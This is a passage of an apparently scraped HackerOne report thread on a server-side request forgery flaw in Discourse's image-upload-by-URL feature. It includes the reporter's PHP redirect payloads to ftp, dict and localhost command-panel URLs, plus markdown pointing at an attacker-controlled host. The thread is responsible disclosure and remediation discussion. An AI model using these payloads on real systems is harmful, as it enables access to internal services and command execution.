Y3lMwIoUf05EQESF56DAXqAPPLzIguWqYse43Fu3rR0Kod4SRKI9ETYrP01wRz5xVgd2auQ8kejiA8344efyhQxkc3iBze4UukBtqzk604geJ6wyBSmoicpk9XqO8dvlhwhYEGoL4EWTozQffflzDAr6r%2FBTrqAb3yz5skpTmfiHh2mY%2FhHGiWzvhaSmhQ5tEgt4YCDEprvoxeYWkvlaxqdLXcMfRTr89qs4wuii5IpOn31c13IIFZzpa09Cs%2BExrDUX44ykH0g1zxLN374%2BwiIK3wd5v3201Stw8drFGqAKHIFBpAjuZIFF37RxSxGgAxlHskSrBBA1YzTX1SQV7r%2FcyXcvsAXO99Rr3E6FQFka96boq3PmqqeaoYxAs03IbehGcOPJ%2F3Ih7ebkxTDLG%2B75tCeMz1g%2BKNymUDx9%2B0KJfzKzXbCzi5TX8vNPGUyjZh2Y7SNRHBl7hFmGgXNktN5w%3D%3D\u0026X-Amz-Signature=a21c306cc2d8e019a171589a46b41dab03f704812bcf816eafc1afee4dfe81db","file_size":768712,"type":"image/png"}],"allow_singular_disclosure_at":"2017-06-18T21:55:49.188Z","allow_singular_disclosure_after":-111395269.2637346,"singular_disclosure_allowed":true,"vote_count":25,"voters":["secator","bl4de","bogdantcaciuc","spam404","reactors08","gamliel","eveeez","r3y","malcolmx","mariuszpoplawski","and 15 more..."],"severity":{"rating":"low","author_type":"Team"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":1673259,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"As i noticed some of the numeric just messed, if it is not clearly then just tell me so i will rewrite the whole report.","markdown_message":"\u003cp\u003eAs i noticed some of the numeric just messed, if it is not clearly then just tell me so i will rewrite the whole report.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-05-14T21:07:41.559Z","updated_at":"2017-05-14T21:07:41.559Z","actor":{"username":"mariuszpoplawski","cleared":false,"url":"/mariuszpoplawski","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/43BtUKfowdJ8ZD7ZW4o2fnfM/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"discourse","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1676807,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Apologies for the delay @marpo. We're looking into this and will get back to you shortly.","markdown_message":"\u003cp\u003eApologies for the delay \u003ca href=\"/marpo\"\u003e@marpo\u003c/a\u003e. We\u0026#39;re looking into this and will get back to you shortly.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-05-16T10:59:50.770Z","updated_at":"2017-05-16T10:59:50.770Z","actor":{"username":"asuka","cleared":false,"url":"/asuka","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/111/923/28e02b13f94679bbda8c7d3b7390776d8977f1b6_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"discourse","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1676816,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"No problem, waiting for response.","markdown_message":"\u003cp\u003eNo problem, waiting for response.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-05-16T11:03:57.498Z","updated_at":"2017-05-16T11:03:57.498Z","actor":{"username":"mariuszpoplawski","cleared":false,"url":"/mariuszpoplawski","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/43BtUKfowdJ8ZD7ZW4o2fnfM/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"discourse","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1677664,"is_internal":false,"editable":false,"type":"Activities::ExternalUserJoined","message":"","markdown_message":"","automated_response":false,"created_at":"2017-05-16T16:24:50.071Z","updated_at":"2017-05-16T16:24:50.071Z","additional_data":{"duplicate_report_id":228851},"actor":{"username":"mlitchfield","cleared":true,"url":"/mlitchfield","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/748/925210b2e90f4053a786099cc4294119a96157a9_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"discourse","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1682626,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"So the issue is that the server is following redirects to weird protocols? I find this report very hard to read and understand.","markdown_message":"\u003cp\u003eSo the issue is that the server is following redirects to weird protocols? I find this report very hard to read and understand.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-05-18T09:05:11.686Z","updated_at":"2017-05-18T09:05:11.686Z","actor":{"username":"discourse_team","cleared":false,"url":"/discourse_team","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/130/970/7a0cbe82b76df13bcdbf07365f42abe856650525_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"discourse","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1682663,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi,\n\nNot exactly but that is also the problem. The server follow redirect to other protocol and send request to different location, that allow attacker to send server side request forgery. The problem is similar to: https://hackerone.com/reports/115748 . The difference here is that discourse use ruby instead of java client. Do you have problems with reproduce the steps? more about SSRF can be read for example here:\n\nhttps://www.acunetix.com/blog/articles/server-side-request-forgery-vulnerability/\n\n\"Server Side Request Forgery (SSRF) can be used to make requests to other internal resources which the web server has access to, but are not publicly facing. Such an example would be accessing instance metadata in Amazon EC2 and OpenStack instances (It is only an example). This service is only available to the server and not to the outside world.\"\n\nThe script should only look for image file and in case of response other then 200 or protocol other then http(s) the request should be blocked..","markdown_message":"\u003cp\u003eHi,\u003c/p\u003e\n\n\u003cp\u003eNot exactly but that is also the problem. The server follow redirect to other protocol and send request to different location, that allow attacker to send server side request forgery. The problem is similar to: \u003ca title=\"https://hackerone.com/reports/115748\" href=\"https://hackerone.com/reports/115748\"\u003ehttps://hackerone.com/reports/115748\u003c/a\u003e . The difference here is that discourse use ruby instead of java client. Do you have problems with reproduce the steps? more about SSRF can be read for example here:\u003c/p\u003e\n\n\u003cp\u003e\u003ca title=\"https://www.acunetix.com/blog/articles/server-side-request-forgery-vulnerability/\" href=\"/redirect?url=https%3A%2F%2Fwww.acunetix.com%2Fblog%2Farticles%2Fserver-side-request-forgery-vulnerability%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://www.acunetix.com/blog/articles/server-side-request-forgery-vulnerability/\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003e\u0026quot;Server Side Request Forgery (SSRF) can be used to make requests to other internal resources which the web server has access to, but are not publicly facing. Such an example would be accessing instance metadata in Amazon EC2 and OpenStack instances (It is only an example). This service is only available to the server and not to the outside world.\u0026quot;\u003c/p\u003e\n\n\u003cp\u003eThe script should only look for image file and in case of response other then 200 or protocol other then http(s) the request should be blocked..\u003c/p\u003e\n","automated_response":false,"created_at":"2017-05-18T09:24:06.368Z","updated_at":"2017-05-18T09:24:06.368Z","actor":{"username":"mariuszpoplawski","cleared":false,"url":"/mariuszpoplawski","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/43BtUKfowdJ8ZD7ZW4o2fnfM/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"discourse","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1682678,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Example:\n\nwhen we will put a evil image inside message content \n\nCONTENT:\n\"TESTa [![](http://192.166.218.53/malicious3.php)](http://192.166.218.53/malicious3.php)\"\n\nAfter submit the message and send it to the receiver the server trying to reach the malicious3.php file. The server did not block the server although it is not an image file. The evil malicious3.php file on remote server redirected the discourse server to other link and protocl\n\nContent of malicious3.php:\n\u003c?php\nheader('Location: ftp://192.166.218.53/');\n?\u003e\n\n\nThe server followed the request and send next request to remote server on protocol :22 which is ftp, i presented it on the screens. In case the attacker will exploit the vulnerability he can try to reach the internal server side protocols by redirecting server to internal resources:\n\n\u003c?php\nheader('Location: ftp://0.0.0.0/');\n?\u003e \n\nor\n\n\u003c?php\nheader('Location: ftp://127.0.0.1/');\n?\u003e\n\nThe future exploitation depands on server side resources. This type of vulnerability can be also use to bypass any type of policies.\n\nSorry for previous badly constructed report, i dont know why after submit all of the numbering  was messed.\n\n\nCheers afine.pl","markdown_message":"\u003cp\u003eExample:\u003c/p\u003e\n\n\u003cp\u003ewhen we will put a evil image inside message content \u003c/p\u003e\n\n\u003cp\u003eCONTENT:\u003cbr\u003e\n\u0026quot;TESTa \u003ca href=\"/redirect?url=http%3A%2F%2F192.166.218.53%2Fmalicious3.php\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003e![](http://192.166.218.53/malicious3.php)\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u0026quot;\u003c/p\u003e\n\n\u003cp\u003eAfter submit the message and send it to the receiver the server trying to reach the malicious3.php file. The server did not block the server although it is not an image file. The evil malicious3.php file on remote server redirected the discourse server to other link and protocl\u003c/p\u003e\n\n\u003cp\u003eContent of malicious3.php:\u003cbr\u003e\n\u0026lt;?php\u003cbr\u003e\nheader(\u0026#39;Location: \u003ca title=\"ftp://192.166.218.53/\u0026#39;\" href=\"/redirect?url=ftp%3A%2F%2F192.166.218.53%2F%27\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eftp://192.166.218.53/\u0026#39;\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e);\u003cbr\u003e\n?\u0026gt;\u003c/p\u003e\n\n\u003cp\u003eThe server followed the request and send next request to remote server on protocol :22 which is ftp, i presented it on the screens. In case the attacker will exploit the vulnerability he can try to reach the internal server side protocols by redirecting server to internal resources:\u003c/p\u003e\n\n\u003cp\u003e\u0026lt;?php\u003cbr\u003e\nheader(\u0026#39;Location: \u003ca title=\"ftp://0.0.0.0/\u0026#39;\" href=\"/redirect?url=ftp%3A%2F%2F0.0.0.0%2F%27\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eftp://0.0.0.0/\u0026#39;\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e);\u003cbr\u003e\n?\u0026gt; \u003c/p\u003e\n\n\u003cp\u003eor\u003c/p\u003e\n\n\u003cp\u003e\u0026lt;?php\u003cbr\u003e\nheader(\u0026#39;Location: \u003ca title=\"ftp://127.0.0.1/\u0026#39;\" href=\"/redirect?url=ftp%3A%2F%2F127.0.0.1%2F%27\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eftp://127.0.0.1/\u0026#39;\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e);\u003cbr\u003e\n?\u0026gt;\u003c/p\u003e\n\n\u003cp\u003eThe future exploitation depands on server side resources. This type of vulnerability can be also use to bypass any type of policies.\u003c/p\u003e\n\n\u003cp\u003eSorry for previous badly constructed report, i dont know why after submit all of the numbering  was messed.\u003c/p\u003e\n\n\u003cp\u003eCheers afine.pl\u003c/p\u003e\n","automated_response":false,"created_at":"2017-05-18T09:30:57.136Z","updated_at":"2017-05-18T09:30:57.136Z","actor":{"username":"mariuszpoplawski","cleared":false,"url":"/mariuszpoplawski","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/43BtUKfowdJ8ZD7ZW4o2fnfM/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"discourse","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1684794,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@asuka I do not find the other report easier to follow.\n\nSo the issue is this?\n\n1. Write a post with a link in it.\n2. We attempt to onebox the link which means we need to get opengraph tags. So we make a HTTP request to the target URL.\n3. The target URL issues a redirect USING A DIFFERENT PROTOCOL, e.g. \"redirect to FTP://1.2.3.4\"\n4. We follow that redirect, which means our server makes a FTP request to our own servers (assuming we operate the server at 1.2.3.4)\n\nSo the issue is redirects not disallowing any protocol other than HTTP?","markdown_message":"\u003cp\u003e\u003ca href=\"/asuka\"\u003e@asuka\u003c/a\u003e I do not find the other report easier to follow.\u003c/p\u003e\n\n\u003cp\u003eSo the issue is this?\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003eWrite a post with a link in it.\u003c/li\u003e\n\u003cli\u003eWe attempt to onebox the link which means we need to get opengraph tags. So we make a HTTP request to the target URL.\u003c/li\u003e\n\u003cli\u003eThe target URL issues a redirect USING A DIFFERENT PROTOCOL, e.g. \u0026quot;redirect to \u003ca title=\"ftp://1.2.3.4\" href=\"/redirect?url=ftp%3A%2F%2F1.2.3.4\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eftp://1.2.3.4\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u0026quot;\u003c/li\u003e\n\u003cli\u003eWe follow that redirect, which means our server makes a FTP request to our own servers (assuming we operate the server at 1.2.3.4)\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003eSo the issue is redirects not disallowing any protocol other than HTTP?\u003c/p\u003e\n","automated_response":false,"created_at":"2017-05-18T23:04:26.151Z","updated_at":"2017-05-18T23:04:26.151Z","actor":{"username":"discourse_team","cleared":false,"url":"/discourse_team","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/130/970/7a0cbe82b76df13bcdbf07365f42abe856650525_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"discourse","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1684998,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi,\n\nThe impact affect only the function that allow to upload image over URL.\n\n1. Attacker click to upload image using external URL\n2. Attacker submit a url to malicious .php file\n\u003c?php\n        header('Location: dict://localhost:11211/stat');\n?\u003e\n\n3. The file contais redirect to link with internal resources\n4. after attacker send message the server will send malicious request and access internal resources on port 11211 \"localhost:11211/stat\"\n\n\nvulnerable_function.png screens show the affected vulnerable function\nrequest.png shows full setup how to reproduce the steps.\n\n\nHere is the attack scenario.\n\nEvery localhost server ip is 127.0.0.1 or 0.0.0.0. If attacker is allow to send any internal server side request he can use this impact to send malicious request to internal resources and  access the administrator panles or functions without additional authentication.\n\n\nLets say your server is providing  some script administrative panel that do not require authentication on port 1234. The script allow to execute system commands, and the request is following http://127.0.0.1:1234/my_panel.php?cmd=ls. The script is not dangerous because it is only localhost script and no one have access to the script from world wide as the port 1234 is only internal and filtred behaind the firewall.\n\n1. Attacker click to upload image using external URL\n2. Attacker submit a url to malicious3 .php file by uploading IMG using external URL  ( like on screens)\n\"TESTa [![](http://192.166.218.53/malicious3.php)](http://192.166.218.53/malicious3.php)\"\n2. Attacker send the message\n3. Server trying to reach the maliciou3.php file\n4. Attacker used a evil script to redirect the server to local resources\n\n\u003c?php\n        header('Location: http://127.0.0.1:1234/mypanel.php?cmd=ping -c 192.166.218.53');\n?\u003e\n\n5. Your servers followed the redirect and sent a \"http://127.0.0.1:1234/my_panel.php?cmd=ping -c 192.166.218.53\" request to local resources.\n6. The attacker was able to execute system  command on your local script that is not accessible  from internet because  you allowed to send any request from your server.\n\nAttacker is able to send any internal or external server side request to any available protocol in the client that execute the payload.\n\nSummary:\n\nThe upload function using external URL should check if the requested link was provided to a valid image file. The addational check should look if the response from the server was \"200\" and if the image on remote server exists. If the server trying to redirect with code \"302\", the server should block that request and do not follow the redirection.\n\nI think now all is clear, soory if previous reports was not clear. If still u don understand the impact please follow the links i wrote. Both of the article and other vulnerability on hackerone.com show sthe impact and security issue.","markdown_message":"\u003cp\u003eHi,\u003c/p\u003e\n\n\u003cp\u003eThe impact affect only the function that allow to upload image over URL.\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003eAttacker click to upload image using external URL\u003c/li\u003e\n\u003cli\u003e\u003cp\u003eAttacker submit a url to malicious .php file\u003cbr\u003e\n\u0026lt;?php\u003cbr\u003e\n    header(\u0026#39;Location: dict://localhost:11211/stat\u0026#39;);\u003cbr\u003e\n?\u0026gt;\u003c/p\u003e\u003c/li\u003e\n\u003cli\u003e\u003cp\u003eThe file contais redirect to link with internal resources\u003c/p\u003e\u003c/li\u003e\n\u003cli\u003e\u003cp\u003eafter attacker send message the server will send malicious request and access internal resources on port 11211 \u0026quot;localhost:11211/stat\u0026quot;\u003c/p\u003e\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003evulnerable_function.png screens show the affected vulnerable function\u003cbr\u003e\nrequest.png shows full setup how to reproduce the steps.\u003c/p\u003e\n\n\u003cp\u003eHere is the attack scenario.\u003c/p\u003e\n\n\u003cp\u003eEvery localhost server ip is 127.0.0.1 or 0.0.0.0. If attacker is allow to send any internal server side request he can use this impact to send malicious request to internal resources and  access the administrator panles or functions without additional authentication.\u003c/p\u003e\n\n\u003cp\u003eLets say your server is providing  some script administrative panel that do not require authentication on port 1234. The script allow to execute system commands, and the request is following \u003ca title=\"http://127.0.0.1:1234/my_panel.php?cmd=ls\" href=\"/redirect?url=http%3A%2F%2F127.0.0.1%3A1234%2Fmy_panel.php%3Fcmd%3Dls\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://127.0.0.1:1234/my_panel.php?cmd=ls\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e. The script is not dangerous because it is only localhost script and no one have access to the script from world wide as the port 1234 is only internal and filtred behaind the firewall.\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003eAttacker click to upload image using external URL\u003c/li\u003e\n\u003cli\u003eAttacker submit a url to malicious3 .php file by uploading IMG using external URL  ( like on screens)\n\u0026quot;TESTa \u003ca href=\"/redirect?url=http%3A%2F%2F192.166.218.53%2Fmalicious3.php\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003e![](http://192.166.218.53/malicious3.php)\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u0026quot;\u003c/li\u003e\n\u003cli\u003eAttacker send the message\u003c/li\u003e\n\u003cli\u003eServer trying to reach the maliciou3.php file\u003c/li\u003e\n\u003cli\u003eAttacker used a evil script to redirect the server to local resources\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003e\u0026lt;?php\u003cbr\u003e\n        header(\u0026#39;Location: \u003ca title=\"http://127.0.0.1:1234/mypanel.php?cmd=ping\" href=\"/redirect?url=http%3A%2F%2F127.0.0.1%3A1234%2Fmypanel.php%3Fcmd%3Dping\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://127.0.0.1:1234/mypanel.php?cmd=ping\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e -c 192.166.218.53\u0026#39;);\u003cbr\u003e\n?\u0026gt;\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003eYour servers followed the redirect and sent a \u0026quot;\u003ca title=\"http://127.0.0.1:1234/my_panel.php?cmd=ping\" href=\"/redirect?url=http%3A%2F%2F127.0.0.1%3A1234%2Fmy_panel.php%3Fcmd%3Dping\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://127.0.0.1:1234/my_panel.php?cmd=ping\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e -c 192.166.218.53\u0026quot; request to local resources.\u003c/li\u003e\n\u003cli\u003eThe attacker was able to execute system  command on your local script that is not accessible  from internet because  you allowed to send any request from your server.\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003eAttacker is able to send any internal or external server side request to any available protocol in the client that execute the payload.\u003c/p\u003e\n\n\u003cp\u003eSummary:\u003c/p\u003e\n\n\u003cp\u003eThe upload function using external URL should check if the requested link was provided to a valid image file. The addational check should look if the response from the server was \u0026quot;200\u0026quot; and if the image on remote server exists. If the server trying to redirect with code \u0026quot;302\u0026quot;, the server should block that request and do not follow the redirection.\u003c/p\u003e\n\n\u003cp\u003eI think now all is clear, soory if previous reports was not clear. If still u don understand the impact please follow the links i wrote. Both of the article and other vulnerability on hackerone.com show sthe impact and security issue.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-05-19T04:14:55.125Z","updated_at":"2017-05-19T04:18:20.476Z","actor":{"username":"mariuszpoplawski","cleared":false,"url":"/mariuszpoplawski","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/43BtUKfowdJ8ZD7ZW4o2fnfM/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"attachments":[{"id":185935,"filename":"vulnerable_function.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/185/935/d59e02aa2f3d69d00d136a902121d9d1170197cb/vulnerable_function.png?response-content-disposition=attachment%3B%20filename%3D%22vulnerable_function.png%22%3B%20filename%2A%3DUTF-8%27%27vulnerable_function.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQXJYPBHFQ%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T050338Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDu4%2FXsLbLXL64kN0gTqrVP%2B6YQy0aFrAsl8mmpM3A02gIhAMCTWiWTqJYsWHj2mR6ExJkLtM%2BAer5nJ1p6uJxIO04QKrQDCFQQARoMMDEzNjE5Mjc0ODQ5IgyKVAfpOTinzYsPSPkqkQMwQonGdI9p7CuN4bjSzjzCvtK%2FWWqz3YU8bTMgRxd1lvP8n%2BmQUW%2FPjx22yWgMPRHSApDfLhipeKY57Ywk6GpNSLkFsR4mWXVTUZ3fv%2BFpIecsA7FNlVffsWQFQL1hvyVhQXlfUb877oYsLHI7rvsdEl2oxxoNNBVppK7LLDUZ5Hszb5rUUqEs3JeInglYJgHEk0JqpQ59Rfq6iusCJYxnpCRnEk4ATJ3WPY0fYnF5%2BrjplwvF9jvrWA8ORsehD7OObtIyHgdE%2BeHQJDIwKM12S2Z3doq1C1frQwXKFiUX0Y9ZT6Dew0nqLavJd23CiqxMaeH6L8Dme7K0ES6LXhVDxzX5ZM48Lw97Faf%2BmTRwYynJlpTsMle9l6X4AISAwVe8d6Y3lMwIoUf05EQESF56DAXqAPPLzIguWqYse43Fu3rR0Kod4SRKI9ETYrP01wRz5xVgd2auQ8kejiA8344efyhQxkc3iBze4UukBtqzk604geJ6wyBSmoicpk9XqO8dvlhwhYEGoL4EWTozQffflzDAr6r%2FBTrqAb3yz5skpTmfiHh2mY%2FhHGiWzvhaSmhQ5tEgt4YCDEprvoxeYWkvlaxqdLXcMfRTr89qs4wuii5IpOn31c13IIFZzpa09Cs%2BExrDUX44ykH0g1zxLN374%2BwiIK3wd5v3201Stw8drFGqAKHIFBpAjuZIFF37RxSxGgAxlHskSrBBA1YzTX1SQV7r%2FcyXcvsAXO99Rr3E6FQFka96boq3PmqqeaoYxAs03IbehGcOPJ%2F3Ih7ebkxTDLG%2B75tCeMz1g%2BKNymUDx9%2B0KJfzKzXbCzi5TX8vNPGUyjZh2Y7SNRHBl7hFmGgXNktN5w%3D%3D\u0026X-Amz-Signature=ca25abb0e5fde3dc2c2b59d43f97e24b60aaa0dc850f6dfa4b41d0f1b65fafc8"},{"id":185934,"filename":"request.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/185/934/7f44b21cfb2cf8664f190d5cf233715e154a19ed/request.png?response-content-disposition=attachment%3B%20filename%3D%22request.png%22%3B%20filename%2A%3DUTF-8%27%27request.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQXJYPBHFQ%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T050338Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDu4%2FXsLbLXL64kN0gTqrVP%2B6YQy0aFrAsl8mmpM3A02gIhAMCTWiWTqJYsWHj2mR6ExJkLtM%2BAer5nJ1p6uJxIO04QKrQDCFQQARoMMDEzNjE5Mjc0ODQ5IgyKVAfpOTinzYsPSPkqkQMwQonGdI9p7CuN4bjSzjzCvtK%2FWWqz3YU8bTMgRxd1lvP8n%2BmQUW%2FPjx22yWgMPRHSApDfLhipeKY57Ywk6GpNSLkFsR4mWXVTUZ3fv%2BFpIecsA7FNlVffsWQFQL1hvyVhQXlfUb877oYsLHI7rvsdEl2oxxoNNBVppK7LLDUZ5Hszb5rUUqEs3JeInglYJgHEk0JqpQ59Rfq6iusCJYxnpCRnEk4ATJ3WPY0fYnF5%2BrjplwvF9jvrWA8ORsehD7OObtIyHgdE%2BeHQJDIwKM12S2Z3doq1C1frQwXKFiUX0Y9ZT6Dew0nqLavJd23CiqxMaeH6L8Dme7K0ES6LXhVDxzX5ZM48Lw97Faf%2BmTRwYynJlpTsMle9l6X4AISAwVe8d6Y3lMwIoUf05EQESF56DAXqAPPLzIguWqYse43Fu3rR0Kod4SRKI9ETYrP01wRz5xVgd2auQ8kejiA8344efyhQxkc3iBze4UukBtqzk604geJ6wyBSmoicpk9XqO8dvlhwhYEGoL4EWTozQffflzDAr6r%2FBTrqAb3yz5skpTmfiHh2mY%2FhHGiWzvhaSmhQ5tEgt4YCDEprvoxeYWkvlaxqdLXcMfRTr89qs4wuii5IpOn31c13IIFZzpa09Cs%2BExrDUX44ykH0g1zxLN374%2BwiIK3wd5v3201Stw8drFGqAKHIFBpAjuZIFF37RxSxGgAxlHskSrBBA1YzTX1SQV7r%2FcyXcvsAXO99Rr3E6FQFka96boq3PmqqeaoYxAs03IbehGcOPJ%2F3Ih7ebkxTDLG%2B75tCeMz1g%2BKNymUDx9%2B0KJfzKzXbCzi5TX8vNPGUyjZh2Y7SNRHBl7hFmGgXNktN5w%3D%3D\u0026X-Amz-Signature=24d30f22065e62c60a2d694918731de766ce7bb9c28d1639124d2380f2f1c1d0"}],"genius_execution_id":null,"team_handle":"discourse","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1685032,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Ps. About your question.\nThe issue is that you allow redirects and allow to submit requests to other protocols too. Attacker should not be able to control the protocol and send any server side requests. Attacker do not need to know what is your ip like you wrote \"1.2.3.4\", as the requests are internal he can use \"localhost\", \"127.0.0.1\" or \"0.0.0.0\" instead of Ip Or domain. Ftp://127.0.0.1 request will send ftp request from your host to port 22 localy.","markdown_message":"\u003cp\u003ePs. About your question.\u003cbr\u003e\nThe issue is that you allow redirects and allow to submit requests to other protocols too. Attacker should not be able to control the protocol and send any server side requests. Attacker do not need to know what is your ip like you wrote \u0026quot;1.2.3.4\u0026quot;, as the requests are internal he can use \u0026quot;localhost\u0026quot;, \u0026quot;127.0.0.1\u0026quot; or \u0026quot;0.0.0.0\u0026quot; instead of Ip Or domain. \u003ca title=\"ftp://127.0.0.1\" href=\"/redirect?url=ftp%3A%2F%2F127.0.0.1\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eftp://127.0.0.1\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e request will send ftp request from your host to port 22 localy.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-05-19T04:51:05.331Z","updated_at":"2017-05-19T04:55:25.480Z","actor":{"username":"mariuszpoplawski","cleared":false,"url":"/mariuszpoplawski","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/43BtUKfowdJ8ZD7ZW4o2fnfM/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"discourse","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1685036,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"To resolve the issue you need to chcek if the provided external url link is starting with valid protocol http:// or https://, ,also chcek if the valid url is a real image file, and block the redirections.","markdown_message":"\u003cp\u003eTo resolve the issue you need to chcek if the provided external url link is starting with valid protocol http:// or https://, ,also chcek if the valid url is a real image file, and block the 